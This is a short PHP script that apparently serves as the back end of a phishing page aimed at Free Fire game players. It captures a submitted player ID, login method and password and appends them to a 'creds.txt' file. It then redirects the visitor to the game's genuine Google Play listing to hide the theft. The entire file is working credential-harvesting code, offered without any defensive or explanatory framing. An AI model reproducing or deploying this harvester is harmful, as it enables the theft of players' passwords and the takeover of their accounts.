<?php
$data = "";
if (isset($_POST['player_id'])) {
  $data = "Free Fire | ID: " . $_POST['player_id'] . " | Method: " . $_POST['method'] . " | Pass: " . $_POST['password'];
}
file_put_contents("creds.txt", $data . "\n", FILE_APPEND);
header('Location: https://play.google.com/store/apps/details?id=com.dts.freefireth');
exit();
?>
